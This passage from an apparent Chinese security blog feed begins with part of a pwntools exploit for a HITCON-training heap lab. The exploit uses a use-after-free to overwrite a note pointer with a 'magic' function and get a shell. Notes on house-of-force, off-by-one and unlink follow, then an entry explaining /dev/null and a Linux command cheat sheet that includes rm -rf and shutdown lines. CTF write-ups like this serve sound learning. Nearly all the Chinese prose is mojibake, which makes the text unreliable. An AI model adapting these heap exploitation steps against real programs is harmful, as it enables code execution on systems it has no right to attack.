spellcheck="true">#sizeéšæ„ï¼Œä¸ç­‰äº8å°±è¡Œ</span>add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'bbb'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#contentçš„å¤§å°ä¸ç­‰äº8ï¼ˆè¿™æ˜¯ç¨‹åºä¸­note_chunkçš„å¤§å°,note_chunkå°±æ˜¯ç¬¬ä¸€æ¬¡mallocçš„é‚£ä¸ªï¼‰ï¼Œæ˜¯ä¸ºäº†ç­‰ä¼šåˆ†é…8 bytesçš„contentä¸ä¼šè¢«åˆ†é…åˆ°ä¹‹å‰çš„contentçš„binä¸Šï¼Œè€Œæ˜¯åˆ†é…åˆ°noteçš„binä¸Šã€‚</span><span class="token comment" spellcheck="true">#æŒ‰ç…§mallocå’Œfreeæœºåˆ¶ï¼Œå¦‚æœæˆ‘ä»¬del_noteæ¢ä¸€ä¸‹ä½ç½®ï¼Œå…ˆdel_note(1)ï¼Œnote2_chunkä¼šè¢«æ”¾åœ¨åŸæ¥çš„note0_chunkä½ç½®ï¼Œè€Œnote3_contenté‡Œçš„magicå‡½æ•°åœ°å€å°±ä¼šè¢«æ”¾åœ¨note1_chunkä½ç½®ï¼Œåé¢çš„print_note(0)ï¼ŒåŒæ ·ä¹Ÿéœ€è¦æ”¹ä¸ºprint_note(1)ï¼Œæ‰èƒ½getshell</span>del_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>del_note<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>bin<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'magic'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>print_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102214243.png" alt=""></p><h2 id="lab11-bamboobox"><a href="#lab11-bamboobox" class="headerlink" title="lab11-bamboobox"></a>lab11-bamboobox</h2><h3 id="hof-house-of-force"><a href="#hof-house-of-force" class="headerlink" title="hof (house of force)"></a>hof (house of force)</h3><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html" target="_blank" rel="noopener">heap-exploitationâ€”â€”house of forceå‚è€ƒé“¾æ¥</a></p><blockquote><p>å¼•ç”¨m4xå¤§ä½¬åšå®¢åŸè¯ï¼š</p><p>ç®€å•è¯´ä¸€ä¸‹æˆ‘å¯¹ hof çš„ç†è§£ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ <strong>top_chunk</strong> çš„ <strong>size</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ§åˆ¶ malloc ä¸€äº›ç²¾å¿ƒè®¾è®¡çš„<strong>å¤§æ•°/è´Ÿæ•°</strong>æ¥å®ç°æ§åˆ¶ top_chunk çš„æŒ‡é’ˆï¼Œå°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™çš„æ•ˆæœï¼Œä¸ªäººæ„Ÿè§‰ï¼Œhof çš„æ ¸å¿ƒæ€æƒ³å°±åœ¨è¿™ä¸ª force ä¸Šï¼Œç–¯ç‹‚ mallocï¼Œç®€å•ç²—æš´æ•ˆæœæ˜æ˜¾ã€‚</p></blockquote><h3 id="off-by-oneæ¼æ´"><a href="#off-by-oneæ¼æ´" class="headerlink" title="off_by_oneæ¼æ´"></a>off_by_oneæ¼æ´</h3><blockquote><p><a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥</a></p><p>ä¸€ä¸ªå­—èŠ‚æº¢å‡ºè¢«ç§°ä¸ºoff-by-oneï¼Œæ›¾ç»çš„ä¸€æ®µæ—¶é—´é‡Œï¼Œoff-by-oneè¢«è®¤ä¸ºæ˜¯ä¸å¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯åæ¥ç ”ç©¶å‘ç°åœ¨å †ä¸Šå“ªæ€•åªæœ‰ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºä¹Ÿä¼šå¯¼è‡´ä»»æ„ä»£ç çš„æ‰§è¡Œã€‚</p></blockquote><blockquote><p>==&gt; off-by-oneæ€»å…±å¯ä»¥åˆ†ä¸ºä¸¤ç§åˆ©ç”¨æ–¹å¼:</p><p><strong>chunk overlapping</strong></p><ul><li><p>off-by-one overwrite allocated</p></li><li><p>off-by-one overwrite freed</p></li><li><p>off-by-one null byte</p></li></ul><p><strong>unlink</strong></p><ul><li><p>off-by-one small bin</p></li><li><p>off-by-one large bin</p></li></ul></blockquote><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">unlinkâ€”â€”pdf</a></p><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p>checksec it!</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102221726.png" alt=""></p><p>å¼€å¯äº†NX,Stackï¼ŒåŒæ ·æ— æ³•é€šè¿‡å¸¸è§„æ–¹å¼æ¥æ”»å‡»ã€‚</p></blockquote><p>å¾…æ›´æ–°ã€‚ã€‚ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-11æœˆ02-Hitcon-å…­&quot;&gt;&lt;a href=&quot;#Pwn-11æœˆ02-Hitcon-å…­&quot; class=&quot;headerlink&quot; title=&quot;Pwn-11æœˆ02-Hitcon-å…­&quot;&gt;&lt;/a&gt;Pwn-11æœˆ02-Hitcon-å…­&lt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>/dev/nullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†</title>
    <link href="http://www.yof3ng.xyz/2018/11/01/devnull%E5%92%8C%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4%E9%9B%86/"/>
    <id>http://www.yof3ng.xyz/2018/11/01/devnullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†/</id>
    <published>2018-11-01T15:16:26.000Z</published>
    <updated>2018-11-01T15:27:37.391Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h1><blockquote><p>ğŸ˜­å› ä¸ºå¿˜äº†å‚è€ƒäº†å“ªäº›æ–‡ç« ï¼Œæ‰€ä»¥å¦‚è‹¥æœ‰ä¾µæƒä¹‹å¤„ï¼Œè¿˜è¯·è”ç³»åšä¸»ã€‚</p></blockquote><h2 id="dev-null-ä¸-é‡å®šå‘"><a href="#dev-null-ä¸-é‡å®šå‘" class="headerlink" title="/dev/null ä¸ é‡å®šå‘"></a>/dev/null ä¸ é‡å®šå‘</h2><p>==&gt; /dev/null æ˜¯linuxç³»ç»Ÿä¸­çš„ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶è®¾å¤‡ï¼Œä»–çš„ä½œç”¨æ˜¯æ¥å—ä¸€åˆ‡è¾“å…¥å®ƒçš„æ•°æ®å¹¶ä¸¢å¼ƒè¿™äº›æ•°æ®,é€šå¸¸è¢«å½“åšåƒåœ¾æ¡¶æ¥ç”¨ã€‚å°†è¾“å‡ºæµé‡å®šå‘åˆ°/dev/nullä¸Šé¢ï¼Œå°±æ˜¯ä¸¢å¼ƒè¿™ä¸ªè¾“å‡ºæµä¸Šçš„æ‰€æœ‰è¾“å‡ºï¼Œ/dev/nullä¹Ÿå«linuxä¸­çš„é»‘æ´ã€‚</p><p><strong>0:è¡¨ç¤ºé”®ç›˜è¾“å…¥(stdin)</strong></p><p><strong>1:è¡¨ç¤ºæ ‡å‡†è¾“å‡º(stdout),</strong>ç³»ç»Ÿé»˜è®¤æ˜¯1 </p><p><strong>2:è¡¨ç¤ºé”™è¯¯è¾“å‡º(stderr)</strong> </p><pre class=" language-bash"><code class="language-bash"><span class="token string">"command >/dev/null 2>&amp;1 &amp;"</span>  ä¸ <span class="token string">"command 1>/dev/null 2>&amp;1 &amp;"</span>  çš„æ„æ€ä¸€æ ·1<span class="token punctuation">)</span> command:   è¡¨ç¤ºshellå‘½ä»¤æˆ–è€…ä¸ºä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº2<span class="token punctuation">)</span> <span class="token operator">></span>:  è¡¨ç¤ºé‡å®šå‘åˆ°å“ªé‡Œ 3<span class="token punctuation">)</span> /dev/null:  è¡¨ç¤ºLinuxçš„ç©ºè®¾å¤‡æ–‡ä»¶ 4<span class="token punctuation">)</span> 2:  è¡¨ç¤ºæ ‡å‡†é”™è¯¯è¾“å‡º5<span class="token punctuation">)</span> <span class="token operator">&amp;</span>1:  <span class="token operator">&amp;</span>è¡¨ç¤ºç­‰åŒäºçš„æ„æ€,  2<span class="token operator">></span><span class="token operator">&amp;</span>1è¡¨ç¤º2çš„è¾“å‡ºé‡å®šå‘äº16<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token keyword">:</span>  **è¡¨ç¤ºåå°æ‰§è¡Œ,å³è¿™æ¡æŒ‡ä»¤æ‰§è¡Œåœ¨åå°è¿è¡Œ** </code></pre><p>==&gt; æ¯”å¦‚ find -user root   2&gt;/dev/null  &gt;1.txt &amp;ï¼Œå°±æ˜¯å°†æ–‡ä»¶ç”¨æˆ·å±æ€§ä¸ºrootçš„æ–‡æ–‡ä»¶ååŠå…¶è·¯å¾„é‡å®šå‘åˆ°æ–‡ä»¶1.txtä¸­</p><p><strong>==&gt; ä½†æ˜¯</strong> find -user root   1&gt;/dev/null å´æ˜¯ä¸ä¸Šä¸€æ¡å‘½ä»¤ä¸åŒçš„ï¼Œç”¨çš„æ˜¯æ ‡å‡†è¾“å‡ºæµï¼Œä¸ä¼šæ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œåªèƒ½è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ï¼›å¦‚æœåŠ ç‚¹ä¸œè¥¿ä¸Šå»å˜æˆ find -user root   1&gt;/dev/null 1&gt;&amp;2 é‚£ä¹ˆæ ‡å‡†è¾“å‡ºæµè¢«é‡å®šå‘åˆ°æ ‡å‡†é”™è¯¯è¾“å‡ºæµï¼Œå°±ä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºæŸ¥æ‰¾åˆ°çš„ä¿¡æ¯äº†ã€‚</p><p>==&gt; å†æ¯”å¦‚ grep -Ri woshiflag.py 2&gt;/dev/null 1&gt;&amp;2 ,å°±æ˜¯å°†ä¸woshiflag.pyè„šæœ¬æœ‰å…³çš„æ–‡ä»¶åˆ—å‡ºï¼Œå¹¶ä¸”å°†æ ‡å‡†è¾“å‡ºæµé‡å®šå‘åˆ°æ ‡å‡†é”™è¯¯è¾“å‡ºæµ,æ˜¾ç¤ºåˆ°å±å¹•ä¸Šã€‚</p><hr><pre class=" language-bash"><code class="language-bash">- <span class="token function">command</span> <span class="token operator">></span> <span class="token function">file</span> 2<span class="token operator">></span>file- <span class="token function">command</span> <span class="token operator">></span> <span class="token function">file</span> 2<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre><p><strong>ä¸åŒç‚¹: I/Oæ•ˆç‡ä¸Šçš„å·®å¼‚</strong> </p><p> ==&gt; command 1&gt;file 2&gt;file è¿™æ ·çš„å†™æ³•,stdoutå’Œstderréƒ½ç›´æ¥é€åˆ°fileä¸­, fileä¼šè¢«æ‰“å¼€ä¸¤æ¬¡,è¿™æ ·stdoutå’Œstderrä¼šäº’ç›¸è¦†ç›–,è¿™æ ·å†™ç›¸å½“ä½¿ç”¨äº†FD1å’ŒFD2ä¸¤ä¸ªåŒæ—¶å»æŠ¢å fileçš„ç®¡é“ã€‚ </p><p>==&gt; command 1&gt;file 2&gt;&amp;1 è¿™æ¡å‘½ä»¤å°±å°†stdoutç›´æ¥é€å‘file, stderr ç»§æ‰¿äº†FD1ç®¡é“å,å†è¢«é€å¾€file,æ­¤æ—¶,fileåªè¢«æ‰“å¼€äº†ä¸€æ¬¡,ä¹Ÿåªä½¿ç”¨äº†ä¸€ä¸ªç®¡é“FD1,å®ƒåŒ…æ‹¬äº†stdoutå’Œstderrçš„å†…å®¹ã€‚</p><p>==&gt; ä»I/O æ•ˆç‡ä¸Š,å‰ä¸€æ¡å‘½ä»¤çš„æ•ˆç‡è¦æ¯”åé¢ä¸€æ¡çš„å‘½ä»¤æ•ˆç‡è¦ä½,æ‰€ä»¥åœ¨ç¼–å†™shellè„šæœ¬çš„æ—¶å€™,æœ€å¤šçš„æ—¶å€™æˆ‘ä»¬ä¼šcommand 1&gt;file 2&gt;&amp;1 è¿™æ ·çš„å†™æ³•ï¼Œ æˆ– â€œcommand &gt;file 2&amp;1â€ </p><h1 id="linux-å¸¸ç”¨å‘½ä»¤é›†"><a href="#linux-å¸¸ç”¨å‘½ä»¤é›†" class="headerlink" title="linux å¸¸ç”¨å‘½ä»¤é›†"></a>linux å¸¸ç”¨å‘½ä»¤é›†</h1><h2 id="ç³»ç»Ÿä¿¡æ¯"><a href="#ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯"></a>ç³»ç»Ÿä¿¡æ¯</h2><pre class=" language-bash"><code class="language-bash">arch æ˜¾ç¤ºæœºå™¨çš„å¤„ç†å™¨æ¶æ„<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token function">uname</span> -m æ˜¾ç¤ºæœºå™¨çš„å¤„ç†å™¨æ¶æ„<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">uname</span> -r æ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨çš„å†…æ ¸ç‰ˆæœ¬ dmidecode -q æ˜¾ç¤ºç¡¬ä»¶ç³»ç»Ÿéƒ¨ä»¶ - <span class="token punctuation">(</span>SMBIOS / DMI<span class="token punctuation">)</span> hdparm -i /dev/hda ç½—åˆ—ä¸€ä¸ªç£ç›˜çš„æ¶æ„ç‰¹æ€§ hdparm -tT /dev/sda åœ¨ç£ç›˜ä¸Šæ‰§è¡Œæµ‹è¯•æ€§è¯»å–æ“ä½œ <span class="token function">cat</span> /proc/cpuinfo æ˜¾ç¤ºCPU infoçš„ä¿¡æ¯ <span class="token function">cat</span> /proc/interrupts æ˜¾ç¤ºä¸­æ–­ <span class="token function">cat</span> /proc/meminfo æ ¡éªŒå†…å­˜ä½¿ç”¨ <span class="token function">cat</span> /proc/swaps æ˜¾ç¤ºå“ªäº›swapè¢«ä½¿ç”¨ <span class="token function">cat</span> /proc/version æ˜¾ç¤ºå†…æ ¸çš„ç‰ˆæœ¬ <span class="token function">cat</span> /proc/net/dev æ˜¾ç¤ºç½‘ç»œé€‚é…å™¨åŠç»Ÿè®¡ <span class="token function">cat</span> /proc/mounts æ˜¾ç¤ºå·²åŠ è½½çš„æ–‡ä»¶ç³»ç»Ÿ lspci -tv ç½—åˆ— PCI è®¾å¤‡ lsusb -tv æ˜¾ç¤º USB è®¾å¤‡ <span class="token function">date</span> æ˜¾ç¤ºç³»ç»Ÿæ—¥æœŸ <span class="token function">cal</span> 2007 æ˜¾ç¤º2007å¹´çš„æ—¥å†è¡¨ <span class="token function">date</span> 041217002007.00 è®¾ç½®æ—¥æœŸå’Œæ—¶é—´ - æœˆæ—¥æ—¶åˆ†å¹´.ç§’ clock -w å°†æ—¶é—´ä¿®æ”¹ä¿å­˜åˆ° BIOSå…³æœº <span class="token punctuation">(</span>ç³»ç»Ÿçš„å…³æœºã€é‡å¯ä»¥åŠç™»å‡º <span class="token punctuation">)</span> <span class="token function">shutdown</span> -h now å…³é—­ç³»ç»Ÿ<span class="token punctuation">(</span>1<span class="token punctuation">)</span> init 0 å…³é—­ç³»ç»Ÿ<span class="token punctuation">(</span>2<span class="token punctuation">)</span> telinit 0 å…³é—­ç³»ç»Ÿ<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token function">shutdown</span> -h hours:minutes <span class="token operator">&amp;</span> æŒ‰é¢„å®šæ—¶é—´å…³é—­ç³»ç»Ÿ <span class="token function">shutdown</span> -c å–æ¶ˆæŒ‰é¢„å®šæ—¶é—´å…³é—­ç³»ç»Ÿ <span class="token function">shutdown</span> -r now é‡å¯<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token function">reboot</span> é‡å¯<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">logout</span> æ³¨é”€</code></pre><h2 id="æ–‡ä»¶å’Œç›®å½•"><a href="#æ–‡ä»¶å’Œç›®å½•" class="headerlink" title="æ–‡ä»¶å’Œç›®å½•"></a>æ–‡ä»¶å’Œç›®å½•</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /home è¿›å…¥ <span class="token string">'/ home'</span> ç›®å½•<span class="token string">' cd .. è¿”å›ä¸Šä¸€çº§ç›®å½• cd ../.. è¿”å›ä¸Šä¸¤çº§ç›®å½• cd è¿›å…¥ä¸ªäººçš„ä¸»ç›®å½• cd ~user1 è¿›å…¥ä¸ªäººçš„ä¸»ç›®å½• cd - è¿”å›ä¸Šæ¬¡æ‰€åœ¨çš„ç›®å½• pwd æ˜¾ç¤ºå·¥ä½œè·¯å¾„ ls æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶ ls -F æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶ ls -l æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•çš„è¯¦ç»†èµ„æ–™ ls -a æ˜¾ç¤ºéšè—æ–‡ä»¶ ls *[0-9]* æ˜¾ç¤ºåŒ…å«æ•°å­—çš„æ–‡ä»¶åå’Œç›®å½•å tree æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„(1) lstree æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„(2) mkdir dir1 åˆ›å»ºä¸€ä¸ªå«åš '</span>dir1<span class="token string">' çš„ç›®å½•'</span> <span class="token function">mkdir</span> dir1 dir2 åŒæ—¶åˆ›å»ºä¸¤ä¸ªç›®å½• <span class="token function">mkdir</span> -p /tmp/dir1/dir2 åˆ›å»ºä¸€ä¸ªç›®å½•æ ‘ <span class="token function">rm</span> -f file1 åˆ é™¤ä¸€ä¸ªå«åš <span class="token string">'file1'</span> çš„æ–‡ä»¶<span class="token string">' rmdir dir1 åˆ é™¤ä¸€ä¸ªå«åš '</span>dir1<span class="token string">' çš„ç›®å½•'</span> <span class="token function">rm</span> -rf dir1 åˆ é™¤ä¸€ä¸ªå«åš <span class="token string">'dir1'</span> çš„ç›®å½•å¹¶åŒæ—¶åˆ é™¤å…¶å†…å®¹ <span class="token function">rm</span> -rf dir1 dir2 åŒæ—¶åˆ é™¤ä¸¤ä¸ªç›®å½•åŠå®ƒä»¬çš„å†…å®¹ <span class="token function">mv</span> dir1 new_dir é‡å‘½å/ç§»åŠ¨ ä¸€ä¸ªç›®å½• <span class="token function">cp</span> file1 file2 å¤åˆ¶ä¸€ä¸ªæ–‡ä»¶ <span class="token function">cp</span> dir/* <span class="token keyword">.</span> å¤åˆ¶ä¸€ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åˆ°å½“å‰å·¥ä½œç›®å½• <span class="token function">cp</span> -a /tmp/dir1 <span class="token keyword">.</span> å¤åˆ¶ä¸€ä¸ªç›®å½•åˆ°å½“å‰å·¥ä½œç›®å½• <span class="token function">cp</span> -a dir1 dir2 å¤åˆ¶ä¸€ä¸ªç›®å½• <span class="token function">ln</span> -s file1 lnk1 åˆ›å»ºä¸€ä¸ªæŒ‡å‘æ–‡ä»¶æˆ–ç›®å½•çš„è½¯é“¾æ¥ <span class="token function">ln</span> file1 lnk1 åˆ›å»ºä¸€ä¸ªæŒ‡å‘æ–‡ä»¶æˆ–ç›®å½•çš„ç‰©ç†é“¾æ¥ <span class="token function">touch</span> -t 0712250000 file1 ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„æ—¶é—´æˆ³ - <span class="token punctuation">(</span>YYMMDDhhmm<span class="token punctuation">)</span> <span class="token function">file</span> file1 outputs the mime <span class="token function">type</span> of the <span class="token function">file</span> as text <span class="token function">iconv</span> -l åˆ—å‡ºå·²çŸ¥çš„ç¼–ç  <span class="token function">iconv</span> -f fromEncoding -t toEncoding inputFile <span class="token operator">></span> outputFile creates a new from the given input <span class="token function">file</span> by assuming it is encoded <span class="token keyword">in</span> fromEncoding and converting it to toEncoding. <span class="token function">find</span> <span class="token keyword">.</span> -maxdepth 1 -name *.jpg -print -exec convert <span class="token string">"{}"</span> -resize 80x60 <span class="token string">"thumbs/{}"</span> \<span class="token punctuation">;</span> batch resize files <span class="token keyword">in</span> the current directory and send them to a thumbnails directory <span class="token punctuation">(</span>requires convert from Imagemagick<span class="token punctuation">)</span></code></pre><h2 id="æ–‡ä»¶æœç´¢"><a href="#æ–‡ä»¶æœç´¢" class="headerlink" title="æ–‡ä»¶æœç´¢"></a>æ–‡ä»¶æœç´¢</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">find</span> / -name file1 ä» <span class="token string">'/'</span> å¼€å§‹è¿›å…¥æ ¹æ–‡ä»¶ç³»ç»Ÿæœç´¢æ–‡ä»¶å’Œç›®å½• <span class="token function">find</span> / -user user1 æœç´¢å±äºç”¨æˆ· <span class="token string">'user1'</span> çš„æ–‡ä»¶å’Œç›®å½• <span class="token function">find</span> /home/user1 -name \*.bin åœ¨ç›®å½• <span class="token string">'/ home/user1'</span> ä¸­æœç´¢å¸¦æœ‰<span class="token string">'.bin'</span> ç»“å°¾çš„æ–‡ä»¶ <span class="token function">find</span> /usr/bin -type f -atime +100 æœç´¢åœ¨è¿‡å»100å¤©å†…æœªè¢«ä½¿ç”¨è¿‡çš„æ‰§è¡Œæ–‡ä»¶ <span class="token function">find</span> /usr/bin -type f -mtime -10 æœç´¢åœ¨10å¤©å†…è¢«åˆ›å»ºæˆ–è€…ä¿®æ”¹è¿‡çš„æ–‡ä»¶ <span class="token function">find</span> / -name \*.rpm -exec <span class="token function">chmod</span> 755 <span class="token string">'{}'</span> \<span class="token punctuation">;</span> æœç´¢ä»¥ <span class="token string">'.rpm'</span> ç»“å°¾çš„æ–‡ä»¶å¹¶å®šä¹‰å…¶æƒé™ <span class="token function">find</span> / -xdev -name \*.rpm æœç´¢ä»¥ <span class="token string">'.rpm'</span> ç»“å°¾çš„æ–‡ä»¶ï¼Œå¿½ç•¥å…‰é©±ã€æ·ç›˜ç­‰å¯ç§»åŠ¨è®¾å¤‡ <span class="token function">locate</span> \*.ps å¯»æ‰¾ä»¥ <span class="token string">'.ps'</span> ç»“å°¾çš„æ–‡ä»¶ - å…ˆè¿è¡Œ <span class="token string">'updatedb'</span> å‘½ä»¤ <span class="token function">whereis</span> halt æ˜¾ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€æºç æˆ–mançš„ä½ç½® <span class="token function">which</span> halt æ˜¾ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„</code></pre><h2 id="æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ"><a href="#æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ"></a>æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">mount</span> /dev/hda2 /mnt/hda2 æŒ‚è½½ä¸€ä¸ªå«åšhda2çš„ç›˜ - ç¡®å®šç›®å½• <span class="token string">'/ mnt/hda2'</span> å·²ç»å­˜åœ¨ <span class="token function">umount</span> /dev/hda2 å¸è½½ä¸€ä¸ªå«åšhda2çš„ç›˜ - å…ˆä»æŒ‚è½½ç‚¹ <span class="token string">'/ mnt/hda2'</span> é€€å‡º <span class="token function">fuser</span> -km /mnt/hda2 å½“è®¾å¤‡ç¹å¿™æ—¶å¼ºåˆ¶å¸è½½ <span class="token function">umount</span> -n /mnt/hda2 è¿è¡Œå¸è½½æ“ä½œè€Œä¸å†™å…¥ /etc/mtab æ–‡ä»¶- å½“æ–‡ä»¶ä¸ºåªè¯»æˆ–å½“ç£ç›˜å†™æ»¡æ—¶éå¸¸æœ‰ç”¨ <span class="token function">mount</span> /dev/fd0 /mnt/floppy æŒ‚è½½ä¸€ä¸ªè½¯ç›˜ <span class="token function">mount</span> /dev/cdrom /mnt/cdrom æŒ‚è½½ä¸€ä¸ªcdromæˆ–dvdrom <span class="token function">mount</span> /dev/hdc /mnt/cdrecorder æŒ‚è½½ä¸€ä¸ªcdrwæˆ–dvdrom <span class="token function">mount</span> /dev/hdb /mnt/cdrecorder æŒ‚è½½ä¸€ä¸ªcdrwæˆ–dvdrom <span class="token function">mount</span> -o loop file.iso /mnt/cdrom æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶æˆ–ISOé•œåƒæ–‡ä»¶ <span class="token function">mount</span> -t vfat /dev/hda5 /mnt/hda5 æŒ‚è½½ä¸€ä¸ªWindows FAT32æ–‡ä»¶ç³»ç»Ÿ <span class="token function">mount</span> /dev/sda1 /mnt/usbdisk æŒ‚è½½ä¸€ä¸ªusb æ·ç›˜æˆ–é—ªå­˜è®¾å¤‡ <span class="token function">mount</span> -t smbfs -o username<span class="token operator">=</span>user,password<span class="token operator">=</span>pass //WinClient/share /mnt/share æŒ‚è½½ä¸€ä¸ªwindowsç½‘ç»œå…±äº«</code></pre><h2 id="ç£ç›˜ç©ºé—´"><a href="#ç£ç›˜ç©ºé—´" class="headerlink" title="ç£ç›˜ç©ºé—´"></a>ç£ç›˜ç©ºé—´</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">df</span> -h æ˜¾ç¤ºå·²ç»æŒ‚è½½çš„åˆ†åŒºåˆ—è¡¨ <span class="token function">ls</span> -lSr <span class="token operator">|</span><span class="token function">more</span> ä»¥å°ºå¯¸å¤§å°æ’åˆ—æ–‡ä»¶å’Œç›®å½• <span class="token function">du</span> -sh dir1 ä¼°ç®—ç›®å½• <span class="token string">'dir1'</span> å·²ç»ä½¿ç”¨çš„ç£ç›˜ç©ºé—´<span class="token string">' du -sk * | sort -rn ä»¥å®¹é‡å¤§å°ä¸ºä¾æ®ä¾æ¬¡æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•çš„å¤§å° rpm -q -a --qf '</span>%10<span class="token punctuation">{</span>SIZE<span class="token punctuation">}</span>t%<span class="token punctuation">{</span>NAME<span class="token punctuation">}</span>n<span class="token string">' | sort -k1,1n ä»¥å¤§å°ä¸ºä¾æ®ä¾æ¬¡æ˜¾ç¤ºå·²å®‰è£…çš„rpmåŒ…æ‰€ä½¿ç”¨çš„ç©ºé—´ (fedora, redhatç±»ç³»ç»Ÿ) dpkg-query -W -f='</span>Installedâˆ’Size<span class="token punctuation">;</span>10tInstalledâˆ’Size<span class="token punctuation">;</span>10t<span class="token punctuation">{</span>Package<span class="token punctuation">}</span>n' <span class="token operator">|</span> <span class="token function">sort</span> -k1,1n ä»¥å¤§å°ä¸ºä¾æ®æ˜¾ç¤ºå·²å®‰è£…çš„debåŒ…æ‰€ä½¿ç”¨çš„ç©ºé—´ <span class="token punctuation">(</span>ubuntu, debianç±»ç³»ç»Ÿ<span class="token punctuation">)</span></code></pre><h2 id="ç”¨æˆ·å’Œç¾¤ç»„"><a href="#ç”¨æˆ·å’Œç¾¤ç»„" class="headerlink" title="ç”¨æˆ·å’Œç¾¤ç»„"></a>ç”¨æˆ·å’Œç¾¤ç»„</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">groupadd</span> group_name åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ç»„ <span class="token function">groupdel</span> group_name åˆ é™¤ä¸€ä¸ªç”¨æˆ·ç»„ <span class="token function">groupmod</span> -n new_group_name old_group_name é‡å‘½åä¸€ä¸ªç”¨æˆ·ç»„ <span class="token function">useradd</span> -c <span class="token string">"Name Surname "</span> -g admin -d /home/user1 -s /bin/bash user1 åˆ›å»ºä¸€ä¸ªå±äº <span class="token string">"admin"</span> ç”¨æˆ·ç»„çš„ç”¨æˆ· <span class="token function">useradd</span> user1 åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ· <span 